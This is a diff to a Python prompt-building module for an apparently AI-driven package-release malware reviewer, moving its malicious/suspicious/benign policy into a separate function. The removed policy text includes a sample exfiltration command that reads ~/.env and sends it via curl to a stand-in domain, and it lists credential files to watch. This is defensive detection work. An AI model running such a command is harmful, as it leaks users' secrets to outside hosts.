@@ -6,6 +6,7 @@ import secrets
 
 from . import execclass, strings
 from .models import Verdict
+from .review_policy import policy_block
 from .backends import ReviewUnavailable, make_backend, validate_verdict   # noqa: F401  re-exported: orchestrator imports reviewer.ReviewUnavailable
 
 logger = logging.getLogger(__name__)
@@ -73,33 +74,15 @@ fit; you cannot see them. Files that "cannot be read as text" (images, fonts, ar
 files) changed but are not shown either; code that reads one of them can be loading a payload. A file marked "unchanged" is shown because an install script or entry point this \
 release adds or changes now runs it: that it now runs is the new behaviour.
 
-WHAT MALICIOUS MEANS. Malicious is a complete chain in code this release adds, never a partial one. Both \
-ends must be in the shown code and you must cite both (chain_source and chain_sink):
-- (a) it reads secrets it did not create or receive through its own flow — environment tokens and keys, \
-~/.npmrc, ~/.ssh, ~/.aws, other tools' credentials, browser or keychain data, crypto wallets, all of \
-process.env — AND sends them off the machine (any host, including the package's own backend);
-- (b) it fetches or decodes a payload AND executes it;
-- (c) it spreads (writes into other packages, publishes, edits other projects) or destroys (deletes or \
-encrypts user files) without being asked.
-Example: `cp ~/.env ~/pkg/env` is benign (nothing leaves the machine). `env=$(cat ~/.env) && curl \
-domain.com/$env` is malicious (a secret is read and sent).
-
-SUSPICIOUS means one end of such a chain is shown and the other is plausibly present but not shown: it runs a \
-payload fetched at run time, or the rest of the chain is in a file listed as not shown.
-
-BENIGN is everything else, including every partial chain: env reads, OS commands, file copies, network \
-calls, telemetry without secrets, a CLI talking to its own service with tokens it was given or its own login \
-returned, a prebuilt binary downloaded from the package's own release or registry. The same binary from a raw \
-IP or an unrelated domain is malicious. Powerful primitives (child_process, eval, network, fs writes) are \
-not evidence by themselves.
+""" + policy_block() + """
 
 RUNS_WHEN. Say when the chain's code runs: install (an install script runs it), load (it runs when the \
 package is imported), command (only when the user types the package's command), not-shipped (tests, \
 examples), unknown. Code that runs only on a command can still be malicious; say so, and it will be held for \
 a person to confirm.
 
-JUDGE THE CHANGE. Your verdict is about what THIS release adds or changes. Behavior that plainly existed \
-before is not new evidence against this release.
+JUDGE THE CHANGE. Your verdict is about what THIS release adds or changes. Report pre-existing behavior \
+separately and do not falsely attribute its introduction to this release.
 
 The dependency screening block is DiffWatch's heuristic screening of registry metadata. Names in it are \
 author-chosen. A finding is a lead to check against the shown package.json and code, not evidence on its own. \
